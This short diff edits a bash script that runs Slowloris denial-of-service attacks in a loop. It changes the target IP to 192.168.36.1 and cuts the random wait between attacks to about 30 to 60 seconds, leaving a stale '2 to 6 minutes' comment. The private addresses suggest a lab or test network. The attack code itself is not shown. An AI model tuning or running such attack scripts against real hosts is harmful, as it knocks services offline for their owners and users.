@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Target IP
-TARGET_IP="192.168.1.102"
+TARGET_IP="192.168.36.1"
 
 # Function to run Slowloris DoS attack
 run_slowloris() {
@@ -85,7 +85,7 @@ main() {
         $ATTACK
 
         # Random delay between 2 to 6 minutes (120 to 360 seconds)
-        RANDOM_DELAY=$((RANDOM % 241 + 120))
+        RANDOM_DELAY=$((RANDOM % 31 + 30))
         echo "Waiting for $RANDOM_DELAY seconds before running another attack..."
         sleep $RANDOM_DELAY
     done
